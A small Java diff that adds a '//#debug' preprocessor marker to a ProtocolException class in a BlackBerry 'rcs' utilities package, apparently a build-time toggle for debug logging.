@@ -15,6 +15,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
  * l'esecuzione di un protocollo. Come effetto fa cadere la comunicazione.
  */
 public class ProtocolException extends Exception {
+	//#debug
     static Debug debug = new Debug("ProtocolException", DebugLevel.VERBOSE);
 
     public ProtocolException(String string) {
